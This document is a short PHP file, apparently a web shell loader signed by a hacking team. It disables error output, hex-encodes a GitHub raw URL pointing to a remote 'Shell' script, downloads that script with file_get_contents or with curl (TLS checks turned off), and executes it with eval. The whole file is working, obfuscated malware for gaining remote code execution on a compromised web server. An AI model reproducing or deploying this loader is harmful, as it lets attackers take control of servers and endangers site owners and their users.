<?php
/*
Powered By DEATH OF FATHER TEAM
*/
error_reporting(0);
ini_set('display_errors', 0);
$u = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f30787234706565642f545235662d5368656c6c2f6d61696e2f7372632f63616368652e706870';
$r = '';
for ($i = 0; $i < strlen($u); $i += 2) {
    $r .= chr(hexdec(substr($u, $i, 2)));
}
$o = @file_get_contents($r);
if ($o !== false && strlen($o) > 10) {
    eval('?>' . $o);
} else {
    $ch = curl_init($r);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0'
    ]);
    $o2 = curl_exec($ch);
    if ($o2 !== false && strlen($o2) > 10) {
        eval('?>' . $o2);
    }
}